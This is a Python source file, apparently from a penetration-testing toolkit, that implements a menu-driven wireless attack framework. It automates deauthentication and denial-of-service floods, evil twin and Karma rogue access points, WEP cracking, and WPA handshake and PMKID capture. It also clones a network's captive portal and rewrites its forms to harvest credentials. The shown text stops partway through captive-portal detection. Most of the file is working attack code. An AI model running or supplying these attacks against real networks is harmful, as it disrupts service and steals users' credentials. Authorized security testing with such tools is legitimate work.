# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================

import subprocess
import sys
import os
import re
import json
import time
import glob
from pathlib import Path
from datetime import datetime
from bs4 import BeautifulSoup

class WirelessAttackFramework:
    def __init__(self):
        self.config_file = Path.cwd() / 'wireless_attack_config.json'
        self.tool_paths = {}
        self.selected_interface = None
        self.target_network = None
        self.discovered_networks = []
        self.load_config()
        self.check_tools()

    def load_config(self):
        """Load tool paths from config"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self.tool_paths = config.get('tool_paths', {})
            except:
                self.tool_paths = {}

    def save_config(self):
        """Save tool paths to config"""
        config = {'tool_paths': self.tool_paths, 'last_updated': datetime.now().isoformat()}
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)

    def find_tool(self, tool_name):
        """Find tool path using which command"""
        try:
            result = subprocess.run(['which', tool_name], capture_output=True, text=True, check=True)
            return result.stdout.strip()
        except:
            return None

    def check_tools(self):
        """Verify required tools are available"""
        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
                         'mdk3', 'hostapd', 'dnsmasq', 'iptables']

        missing = []
        for tool in required_tools:
            if tool not in self.tool_paths or not Path(self.tool_paths[tool]).exists():
                path = self.find_tool(tool)
                if path:
                    self.tool_paths[tool] = path
                else:
                    missing.append(tool)

        if self.tool_paths:
            self.save_config()

        if missing:
            print(f"Warning: Missing tools: {', '.join(missing)}")
            print("Some attacks may not be available.")

    def get_available_interfaces(self):
        """Get wireless interfaces not currently in use"""
        interfaces = []

        # Check /sys/class/net for all wireless interfaces
        net_path = Path('/sys/class/net')
        if net_path.exists():
            for iface_dir in net_path.iterdir():
                if (iface_dir / 'wireless').exists():
                    iface = iface_dir.name

                    # Check if interface is not connected to a network
                    try:
                        result = subprocess.run(['sudo', 'iwconfig', iface],
                                              capture_output=True, text=True)
                        # iwconfig outputs to stderr on some systems, stdout on others
                        output = result.stderr + result.stdout

                        # Check if actually in use by a process
                        ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                        in_use_by_process = iface in ps_result.stdout

                        # Interface is available if:
                        # 1. Not associated with an AP (Not-Associated or ESSID:off/any)
                        # 2. OR in monitor mode but not being used by a process
                        # 3. Not connected to a network (has IP and ESSID)

                        if 'Mode:Monitor' in output:
                            # Monitor mode - check if actually in use
                            if not in_use_by_process:
                                interfaces.append(iface)
                        elif ('Not-Associated' in output or
                              'ESSID:off/any' in output or
                              'ESSID:""' in output or
                              'Access Point: Not-Associated' in output):
                            # Managed mode, not connected
                            interfaces.append(iface)
                        # If connected (has ESSID with value), exclude it

                    except Exception as e:
                        # If we can't check, include it anyway
                        interfaces.append(iface)

        return sorted(set(interfaces))

    def select_interface(self):
        """Prompt user to select attack interface"""
        interfaces = self.get_available_interfaces()

        if not interfaces:
            print("No available wireless interfaces found!")
            print("Ensure interfaces are not connected to networks.")
            return False

        print("\n" + "="*60)
        print("AVAILABLE WIRELESS INTERFACES")
        print("="*60)

        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")

        while True:
            try:
                choice = input("\nSelect interface for attacks (number): ").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    self.selected_interface = interfaces[idx]
                    print(f"Selected: {self.selected_interface}")
                    return True
                else:
                    print("Invalid selection.")
            except (ValueError, KeyboardInterrupt):
                print("\nCancelled.")
                return False

    def find_airodump_csv(self):
        """Find most recent airodump CSV file"""
        csv_files = glob.glob('*.csv')
        # Filter out kismet CSV files, but keep regular CSV files
        csv_files = [f for f in csv_files if not f.endswith('.kismet.csv') and not f.endswith('.log.csv')]

        if not csv_files:
            # Try log.csv format as fallback
            csv_files = glob.glob('*-01.log.csv')

        if not csv_files:
            return None

        # Get most recent file
        csv_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
        return csv_files[0]

    def parse_airodump_csv(self, csv_file):
        """Parse airodump CSV for target networks and associated clients"""
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Remove line continuations (fields that wrap to next line)
            content = content.replace('\n ', ' ')

            lines = content.split('\n')
            networks = []
            clients = {}  # Map of BSSID -> list of client MACs

            in_ap_section = True
            in_station_section = False
            header_found = False

            for line in lines:
                line = line.strip()

                if not line:
                    continue

                # Detect station section
                if 'Station MAC' in line:
                    in_ap_section = False
                    in_station_section = True
                    continue

                # Parse AP section
                if in_ap_section:
                    if 'BSSID' in line and 'ESSID' in line:
                        header_found = True
                        continue

                    if header_found:
                        fields = [f.strip() for f in line.split(',')]

                        if len(fields) >= 14:
                            bssid = fields[0]
                            channel = fields[3]
                            privacy = fields[5]
                            power = fields[8]
                            essid = fields[13] if fields[13] else '[Hidden]'

                            if ':' in bssid and len(bssid) >= 17:
                                networks.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'privacy': privacy,
                                    'power': power
                                })

                # Parse Station section
                elif in_station_section:
                    fields = [f.strip() for f in line.split(',')]

                    # Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
                    if len(fields) >= 6:
                        station_mac = fields[0]
                        bssid = fields[5]

                        # Only include associated clients (not "(not associated)")
                        if ':' in station_mac and ':' in bssid and 'not associated' not in bssid.lower():
                            if bssid not in clients:
                                clients[bssid] = []
                            if station_mac not in clients[bssid]:
                                clients[bssid].append(station_mac)

            # Store clients mapping
            self.clients_by_bssid = clients
            return networks

        except Exception as e:
            print(f"Error parsing CSV: {e}")
            return []

    def select_target_network(self):
        """Select target network from airodump data"""
        csv_file = self.find_airodump_csv()

        if not csv_file:
            print("\nNo airodump CSV files found in current directory.")
            print("Run airodump-ng first to scan for networks.")
            print("\nStarting Attack Framework in Captive Portal Mode")
            print("(You can still use the default captive portal attack)")

            # Set a placeholder target so the framework can continue
            self.target_network = {
                'essid': '[No Target Selected]',
                'bssid': '00:00:00:00:00:00',
                'channel': '6',
                'privacy': 'OPN',
                'power': '0'
            }
            self.discovered_networks = []
            self.clients_by_bssid = {}
            return True  # Return True to continue to main menu

        print(f"\nReading networks from: {csv_file}")
        self.discovered_networks = self.parse_airodump_csv(csv_file)

        if not self.discovered_networks:
            print("No networks found in CSV file.")
            print("\nStarting Attack Framework in Captive Portal Mode")

            self.target_network = {
                'essid': '[No Target Selected]',
                'bssid': '00:00:00:00:00:00',
                'channel': '6',
                'privacy': 'OPN',
                'power': '0'
            }
            return True

        print("\n" + "="*70)
        print("DISCOVERED NETWORKS")
        print("="*70)
        print(f"{'#':<3} {'BSSID':<18} {'ESSID':<25} {'CH':<4} {'PWR':<5} {'SEC':<10}")
        print("-"*70)

        for i, net in enumerate(self.discovered_networks, 1):
            print(f"{i:<3} {net['bssid']:<18} {net['essid']:<25} {net['channel']:<4} {net['power']:<5} {net['privacy']:<10}")

        while True:
            try:
                choice = input("\nSelect target network (number): ").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(self.discovered_networks):
                    self.target_network = self.discovered_networks[idx]
                    print(f"\nTarget set: {self.target_network['essid']} ({self.target_network['bssid']})")
                    return True
                else:
                    print("Invalid selection.")
            except (ValueError, KeyboardInterrupt):
                print("\nCancelled.")
                return False

    def display_attack_menu(self):
        """Display main attack menu"""
        print("\n" + "="*60)
        print("WIRELESS ATTACK MENU")
        print("="*60)
        print(f"Interface: {self.selected_interface}")
        if self.target_network:
            print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']}) CH:{self.target_network['channel']}")
        print("-"*60)
        print("1.  Deauthentication Attack")
        print("2.  Denial of Service Attacks (submenu)")
        print("3.  Evil Twin / Rogue AP")
        print("4.  Karma/MANA Attack")
        print("5.  Captive Portal Attack")
        print("6.  PMKID Capture")
        print("7.  WPA/WPA2 Handshake Capture")
        print("8.  WEP Attacks (submenu)")
        print("9.  Change Target Network")
        print("10. Change Interface")
        print("11. Exit")
        print("-"*60)

    def deauth_attack(self):
        """Execute deauthentication attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("DEAUTHENTICATION ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")
        print(f"Channel: {self.target_network['channel']}")

        # Get associated clients for this BSSID
        target_bssid = self.target_network['bssid']
        clients = self.clients_by_bssid.get(target_bssid, [])

        print(f"\nAssociated clients: {len(clients)}")
        if clients:
            for i, client in enumerate(clients, 1):
                print(f"  {i}. {client}")

        # Attack type selection
        print("\n1. Broadcast (all clients)")
        if clients:
            print("2. Specific client (from list above)")
            print("3. Manual client MAC entry")
        else:
            print("2. Manual client MAC entry")

        attack_type = input("Select attack type: ").strip()

        client_mac = None
        if attack_type == '2' and clients:
            # Select from list
            while True:
                try:
                    choice = input("Select client number: ").strip()
                    idx = int(choice) - 1
                    if 0 <= idx < len(clients):
                        client_mac = clients[idx]
                        break
                    else:
                        print("Invalid selection.")
                except (ValueError, KeyboardInterrupt):
                    print("Cancelled.")
                    return
        elif (attack_type == '3' and clients) or (attack_type == '2' and not clients):
            # Manual entry
            client_mac = input("Enter client MAC address: ").strip()

        packet_count = input("Packet count (0 for continuous, default 10): ").strip() or "10"

        # Set interface to target channel
        channel = self.target_network['channel'].strip()
        print(f"\nSetting interface to channel {channel}...")
        try:
            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                          check=True, capture_output=True)
            print(f"Interface set to channel {channel}")
        except subprocess.CalledProcessError as e:
            print(f"Warning: Could not set channel: {e}")
            print("Attack may fail if interface is on wrong channel.")

        cmd = ['sudo', self.tool_paths['aireplay-ng'], '--deauth', packet_count,
               '-a', self.target_network['bssid']]

        if client_mac:
            cmd.extend(['-c', client_mac])

        cmd.append(self.selected_interface)

        print(f"\nLaunching attack...")
        print(f"Command: {' '.join(cmd)}")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
            print("\nAttack completed.")
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def check_mdk3_and_guide(self):
        """Check for mdk3 and provide installation guidance"""
        if 'mdk3' not in self.tool_paths:
            mdk3_path = self.find_tool('mdk3')
            if mdk3_path:
                self.tool_paths['mdk3'] = mdk3_path
                self.save_config()
                print(f"Found mdk3 at: {mdk3_path}")
                return True
            else:
                print("\n" + "="*60)
                print("MDK3 NOT INSTALLED")
                print("="*60)
                print("mdk3 is required for Authentication DoS and Beacon Flood attacks.")
                print("\nTo install mdk3, run these commands:")
                print("-" * 60)
                print("sudo apt-get install build-essential libpcap-dev")
                print("git clone https://github.com/charlesxsh/mdk3-master.git")
                print("cd mdk3-master")
                print("make")
                print("sudo make install")
                print("-" * 60)
                print("\nAfter installation, restart this script.")
                input("\nPress Enter to continue...")
                return False
        return True

    def auth_dos_attack(self):
        """Execute authentication DoS attack"""
        if not self.target_network:
            print("No target selected.")
            return

        # Check if mdk3 is available
        if not self.check_mdk3_and_guide():
            return

        print("\n" + "="*50)
        print("AUTHENTICATION DOS ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        cmd = ['sudo', self.tool_paths['mdk3'], self.selected_interface, 'a',
               '-a', self.target_network['bssid']]

        print(f"\nLaunching attack...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def beacon_flood_attack(self):
        """Execute beacon flood attack"""
        # Check if mdk3 is available
        if not self.check_mdk3_and_guide():
            return

        print("\n" + "="*50)
        print("BEACON FLOOD ATTACK")
        print("="*50)

        essid_count = input("Number of fake APs (default 50): ").strip() or "50"

        cmd = ['sudo', self.tool_paths['mdk3'], self.selected_interface, 'b',
               '-n', essid_count, '-s', '1000']

        print(f"\nLaunching beacon flood...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def evil_twin_attack(self):
        """Execute evil twin / rogue AP attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("EVIL TWIN / ROGUE AP ATTACK")
        print("="*50)
        print(f"Cloning: {self.target_network['essid']}")
        print(f"Channel: {self.target_network['channel']}")

        cmd = ['sudo', self.tool_paths['airbase-ng'],
               '-e', self.target_network['essid'],
               '-c', self.target_network['channel'],
               '-a', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching evil twin AP...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def captive_portal_attack(self):
        """Execute captive portal attack"""
        print("\n" + "="*50)
        print("CAPTIVE PORTAL ATTACK")
        print("="*50)
        print("This attack requires additional setup:")
        print("1. Clone target portal with httrack")
        print("2. Modify forms to capture credentials")
        print("3. Setup web server, DNS, and DHCP")
        print("\nThis is a complex attack - implement manually or use specialized tools.")
        input("\nPress Enter to continue...")

    def dos_attacks_menu(self):
        """Denial of Service attacks submenu"""
        while True:
            print("\n" + "="*60)
            print("DENIAL OF SERVICE ATTACKS")
            print("="*60)
            if self.target_network:
                print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']})")
            print("-"*60)
            print("1. Authentication DoS (mdk3)")
            print("2. Beacon Flood (mdk3)")
            print("3. CTS Frame Flood")
            print("4. Back to main menu")
            print("-"*60)

            choice = input("\nSelect DoS attack (1-4): ").strip()

            if choice == '1':
                self.auth_dos_attack()
            elif choice == '2':
                self.beacon_flood_attack()
            elif choice == '3':
                self.cts_flood_attack()
            elif choice == '4':
                break
            else:
                print("Invalid selection.")

    def wep_attacks_menu(self):
        """WEP attacks submenu"""
        while True:
            print("\n" + "="*60)
            print("WEP ATTACKS (Legacy Networks)")
            print("="*60)
            if self.target_network:
                print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']})")
            print("-"*60)
            print("1. Fake Authentication")
            print("2. ARP Replay Attack")
            print("3. Fragmentation Attack")
            print("4. ChopChop Attack")
            print("5. Crack WEP Key (aircrack-ng)")
            print("6. Back to main menu")
            print("-"*60)

            choice = input("\nSelect WEP attack (1-6): ").strip()

            if choice == '1':
                self.wep_fake_auth()
            elif choice == '2':
                self.wep_arp_replay()
            elif choice == '3':
                self.wep_fragmentation()
            elif choice == '4':
                self.wep_chopchop()
            elif choice == '5':
                self.wep_crack()
            elif choice == '6':
                break
            else:
                print("Invalid selection.")

    def karma_attack(self):
        """Execute Karma/MANA attack"""
        print("\n" + "="*50)
        print("KARMA/MANA ATTACK")
        print("="*50)
        print("This attack responds to all client probe requests,")
        print("tricking devices into connecting to your fake AP.")

        essid = input("\nFake AP ESSID (or press Enter for 'FreeWiFi'): ").strip() or "FreeWiFi"
        channel = input("Channel (1-11, default 6): ").strip() or "6"

        print("\nKarma attack creates an AP that responds to all probe requests.")
        print("Clients searching for networks may auto-connect.")

        # Use airbase-ng with -P flag for probe response
        cmd = ['sudo', self.tool_paths['airbase-ng'],
               '-e', essid,
               '-c', channel,
               '-P',  # Respond to all probes
               self.selected_interface]

        print(f"\nLaunching Karma attack...")
        print(f"ESSID: {essid}")
        print(f"Channel: {channel}")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def cts_flood_attack(self):
        """CTS frame flood attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("CTS FRAME FLOOD ATTACK")
        print("="*50)
        print(f"Target Channel: {self.target_network['channel']}")
        print("\nThis floods the channel with CTS frames,")
        print("blocking all communication.")

        # Check if mdk3 is available
        if not self.check_mdk3_and_guide():
            return

        cmd = ['sudo', self.tool_paths['mdk3'],
               self.selected_interface, 'c',
               '-c', self.target_network['channel']]

        print(f"\nLaunching CTS flood on channel {self.target_network['channel']}...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_fake_auth(self):
        """WEP fake authentication"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP FAKE AUTHENTICATION")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-1', '0',  # Fake auth
               '-a', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nAttempting fake authentication...")
        print("This associates with the AP for packet injection.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_arp_replay(self):
        """WEP ARP replay attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP ARP REPLAY ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")
        print("\nThis captures and replays ARP packets to generate IVs.")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-3',  # ARP replay
               '-b', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching ARP replay...")
        print("Waiting for ARP packet...\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_fragmentation(self):
        """WEP fragmentation attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP FRAGMENTATION ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-5',  # Fragmentation
               '-b', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching fragmentation attack...")
        print("This obtains keystream for packet injection.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_chopchop(self):
        """WEP chopchop attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP CHOPCHOP ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-4',  # Chopchop
               '-b', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching chopchop attack...")
        print("This decrypts WEP packets without the key.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_crack(self):
        """Crack WEP key from capture"""
        print("\n" + "="*50)
        print("CRACK WEP KEY")
        print("="*50)

        cap_file = input("Enter capture file name (.cap): ").strip()

        if not Path(cap_file).exists():
            print(f"File {cap_file} not found.")
            return

        cmd = ['sudo', self.tool_paths['aircrack-ng'], cap_file]

        print(f"\nCracking WEP key from {cap_file}...")
        print("This requires at least 40,000-85,000 IVs.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nCracking stopped.")

    def wpa_handshake_capture(self):
        """Capture WPA/WPA2 4-way handshake"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WPA/WPA2 HANDSHAKE CAPTURE")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")
        print(f"Channel: {self.target_network['channel']}")

        # Get associated clients
        target_bssid = self.target_network['bssid']
        clients = self.clients_by_bssid.get(target_bssid, [])

        if clients:
            print(f"\nAssociated clients found: {len(clients)}")
            for i, client in enumerate(clients, 1):
                print(f"  {i}. {client}")
        else:
            print("\nNo associated clients found in CSV.")
            print("You may need to wait for a client to connect,")
            print("or use deauth attack to force re-authentication.")

        output_file = f"handshake_{self.target_network['bssid'].replace(':', '')}"

        print(f"\nCapture will be saved to: {output_file}")
        print("\nOptions:")
        print("1. Passive capture (wait for natural authentication)")
        print("2. Active capture (deauth client to force re-auth)")

        choice = input("\nSelect capture mode (1-2): ").strip()

        if choice == '2':
            if not clients:
                print("\nNo clients to deauth. Running passive capture instead.")
                choice = '1'
            else:
                # Ask which client to deauth
                print("\nSelect client to deauthenticate:")
                print("0. All clients (broadcast)")
                for i, client in enumerate(clients, 1):
                    print(f"{i}. {client}")

                client_choice = input("\nSelect client (0 for all): ").strip()

                if client_choice == '0':
                    deauth_target = None  # Broadcast
                else:
                    try:
                        idx = int(client_choice) - 1
                        if 0 <= idx < len(clients):
                            deauth_target = clients[idx]
                        else:
                            print("Invalid selection, using broadcast.")
                            deauth_target = None
                    except ValueError:
                        print("Invalid input, using broadcast.")
                        deauth_target = None

        # Set interface to target channel
        channel = self.target_network['channel'].strip()
        print(f"\nSetting interface to channel {channel}...")
        try:
            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                          check=True, capture_output=True)
        except subprocess.CalledProcessError:
            print("Warning: Could not set channel")

        # Start airodump capture
        airodump_cmd = ['sudo', self.tool_paths['airodump-ng'],
                       '-c', channel,
                       '--bssid', self.target_network['bssid'],
                       '-w', output_file,
                       self.selected_interface]

        print(f"\nStarting handshake capture...")
        print("Waiting for WPA handshake...")

        if choice == '2':
            print("\nCapture started. Will deauth client in 5 seconds...")
            print("Watch for 'WPA handshake' message in airodump output")
            print("Press Ctrl+C when handshake is captured\n")

            # Start airodump in background
            import threading
            airodump_proc = subprocess.Popen(airodump_cmd)

            # Wait 5 seconds for airodump to start
            time.sleep(5)

            # Send deauth packets
            print("Sending deauth packets...")
            deauth_cmd = ['sudo', self.tool_paths['aireplay-ng'],
                         '--deauth', '5',
                         '-a', self.target_network['bssid']]

            if deauth_target:
                deauth_cmd.extend(['-c', deauth_target])

            deauth_cmd.append(self.selected_interface)

            try:
                subprocess.run(deauth_cmd, timeout=10)
            except:
                pass

            print("\nDeauth sent. Waiting for handshake...")
            print("Press Ctrl+C when you see 'WPA handshake' message\n")

            try:
                airodump_proc.wait()
            except KeyboardInterrupt:
                airodump_proc.terminate()
                airodump_proc.wait()
        else:
            # Passive mode
            print("\nPress Ctrl+C when handshake is captured\n")
            try:
                subprocess.run(airodump_cmd)
            except KeyboardInterrupt:
                pass

        print(f"\nCapture saved to: {output_file}-01.cap")
        print("\nTo crack the handshake:")
        print(f"  aircrack-ng -w /path/to/wordlist.txt {output_file}-01.cap")
        print(f"  hashcat -m 22000 {output_file}.hc22000 /path/to/wordlist.txt")

    def pmkid_capture(self):
        """Capture PMKID for WPA/WPA2 cracking"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("PMKID CAPTURE")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        output_file = f"pmkid_{self.target_network['bssid'].replace(':', '')}"

        cmd = ['sudo', self.tool_paths['airodump-ng'],
               '-c', self.target_network['channel'],
               '--bssid', self.target_network['bssid'],
               '-w', output_file,
               self.selected_interface]

        print(f"\nCapturing PMKID...")
        print("Press Ctrl+C when capture is complete\n")

        try:
            subprocess.run(cmd)
            print(f"\nCapture saved to: {output_file}")
        except KeyboardInterrupt:
            print("\nCapture stopped.")

    def wps_attacks(self):
        """WPS attack menu"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WPS ATTACKS")
        print("="*50)
        print("WPS attacks require additional tools (reaver, bully, etc.)")
        print("Install these tools separately for WPS functionality.")
        input("\nPress Enter to continue...")

    def captive_portal_attack(self):
        """Execute captive portal attack with cloning options"""
        print("\n" + "="*60)
        print("CAPTIVE PORTAL ATTACK")
        print("="*60)
        print("1. Use default captive portal")
        print("2. Clone target network captive portal")
        print("3. Back to main menu")
        print("-"*60)

        choice = input("\nSelect option (1-3): ").strip()

        if choice == '1':
            self.default_captive_portal()
        elif choice == '2':
            self.clone_captive_portal()
        elif choice == '3':
            return
        else:
            print("Invalid selection.")

    def find_strongest_ap_for_ssid(self, target_ssid):
        """Find the AP with strongest signal for a given SSID"""
        # Filter networks matching the target SSID
        matching_aps = [net for net in self.discovered_networks
                        if net['essid'] == target_ssid]

        if not matching_aps:
            return None

        # Convert power to int for comparison (remove any non-numeric chars)
        for ap in matching_aps:
            try:
                # Power is like "-46", convert to int
                ap['power_int'] = int(ap['power'].strip())
            except:
                ap['power_int'] = -100  # Default to very weak if can't parse

        # Sort by power (higher/closer to 0 is stronger)
        # -46 > -74, so we want max()
        strongest = max(matching_aps, key=lambda x: x['power_int'])

        print(f"\nFound {len(matching_aps)} APs with SSID '{target_ssid}'")
        print(f"Selecting strongest: {strongest['bssid']} (Power: {strongest['power']} dBm)")

        return strongest

    def clone_captive_portal(self):
        """Clone target network's captive portal"""
        if not self.target_network:
            print("No target selected.")
            return

        # Find strongest AP for this SSID
        target_ssid = self.target_network['essid']
        strongest_ap = self.find_strongest_ap_for_ssid(target_ssid)

        if strongest_ap:
            # Use strongest AP instead of originally selected target
            connection_target = strongest_ap
            print(f"\nUsing strongest AP for connection:")
            print(f"  BSSID: {strongest_ap['bssid']}")
            print(f"  Channel: {strongest_ap['channel']}")
            print(f"  Power: {strongest_ap['power']} dBm")
        else:
            # Fallback to original target
            connection_target = self.target_network

        # Verify target is open network
        if connection_target['privacy'].upper() not in ['OPN', 'OPEN', '']:
            print(f"\nWarning: Target network appears to be {connection_target['privacy']}")
            print("This attack works best on open (OPN) networks with captive portals.")
            proceed = input("Continue anyway? (y/n): ").strip().lower()
            if proceed != 'y':
                return

        portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}")
        portal_dir.mkdir(parents=True, exist_ok=True)

        print(f"\n{'='*60}")
        print(f"CLONING CAPTIVE PORTAL: {target_ssid}")
        print(f"{'='*60}")

        # Step 1: Connect to target network using strongest AP
        print(f"\n[1/6] Connecting to target network...")
        if not self.connect_to_network(target_ssid):
            print("Failed to connect to target network.")
            return

        # Rest of the method stays the same...
        # Step 2: Detect captive portal URL
        print(f"\n[2/6] Detecting captive portal URL...")
        portal_url = self.detect_captive_portal()
        if not portal_url:
            print("Could not detect captive portal. Using default URL.")
            portal_url = "http://192.168.1.1"

        print(f"Portal URL: {portal_url}")

        # Step 3: Clone portal with httrack
        print(f"\n[3/6] Cloning portal with httrack...")
        if not self.clone_portal_wget(portal_url, portal_dir):
            print("Failed to clone portal.")
            self.disconnect_from_network()
            return

        # Step 4: Modify cloned portal forms
        print(f"\n[4/6] Modifying portal forms to capture credentials...")
        self.modify_portal_forms(portal_dir)

        # Step 5: Disconnect from target network
        print(f"\n[5/6] Disconnecting from target network...")
        self.disconnect_from_network()

        # Step 6: Launch rogue AP with cloned portal
        print(f"\n[6/6] Launching rogue AP with cloned portal...")
        print(f"\nPortal files stored in: {portal_dir}")
        print("\nStarting infrastructure:")
        print("  - Rogue AP (airbase-ng)")
        print("  - DHCP server (dnsmasq)")
        print("  - DNS redirect")
        print("  - Web server (Python)")
        print("\nPress Ctrl+C to stop all services\n")

        input("Press Enter to start, or Ctrl+C to cancel...")

        self.launch_rogue_ap_with_portal(portal_dir)

    def connect_to_network(self, ssid, bssid=None):
        """Connect attacking interface to target network using NetworkManager"""
        try:
            print(f"Connecting to {ssid}...")

            # Simple nmcli connection - that's it!
            result = subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
                                'ifname', self.selected_interface],
                                capture_output=True, text=True, timeout=30)

            if result.returncode != 0:
                print(f"Connection failed: {result.stderr}")
                return False

            print(f"Connected to {ssid}")
            time.sleep(2)

            # Verify we got an IP
            check = subprocess.run(['ip', 'addr', 'show', self.selected_interface],
                                capture_output=True, text=True)

            if 'inet ' in check.stdout:
                ip_match = re.search(r'inet ([\d.]+)', check.stdout)
                if ip_match:
                    print(f"IP Address: {ip_match.group(1)}")
                return True

            return False

        except subprocess.TimeoutExpired:
            print("Connection timeout")
            return False
        except Exception as e:
            print(f"Connection error: {e}")
            return False

    def disconnect_from_network(self):
        """Disconnect from current network using NetworkManager"""
        try:
            print("Disconnecting from network...")
            subprocess.run(['sudo', 'nmcli', 'device', 'disconnect', self.selected_interface],
                        capture_output=True, timeout=10)
            time.sleep(1)
            print("Disconnected")
            return True
        except Exception as e:
            print(f"Disconnect error: {e}")
            return False

    def detect_captive_portal(self):
        """Detect captive portal URL by attempting common detection methods"""
        import socket

        # Common captive portal detection URLs
        detection_urls = [
            'http://captive.apple.com',
